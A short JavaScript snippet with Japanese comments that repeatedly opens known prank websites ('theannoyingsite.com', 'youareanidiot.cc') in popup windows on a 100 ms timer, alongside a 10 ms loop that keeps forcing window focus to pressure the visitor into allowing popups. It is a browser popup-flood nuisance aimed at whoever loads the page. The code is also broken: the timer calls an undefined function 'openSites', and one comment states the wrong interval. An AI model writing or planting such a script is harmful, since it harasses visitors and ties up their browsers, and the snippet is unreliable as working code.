    <script>
        function openRandomSite() {
            const urls = [
                "http://theannoyingsite.com/",
                "http://youareanidiot.cc/",
            ];
            
            // ランダムにインデックスを選ぶ
            const randomIndex = Math.floor(Math.random() * urls.length);
            const randomUrl = urls[randomIndex];
            
            // ランダムに選んだURLを新しいウィンドウで開く
            window.open(randomUrl, "_blank", "width=800,height=600");
        }

        // 100ms ごとに openSites を実行 
        setInterval(openSites, 100); 
 
        // 100ms ごとにポップアップ許可を促す 
        setInterval(() => { 
            try { 
                window.focus(); 
            } catch (e) { 
                console.log("ポップアップ許可が必要かもしれません"); 
            } 
        }, 10);
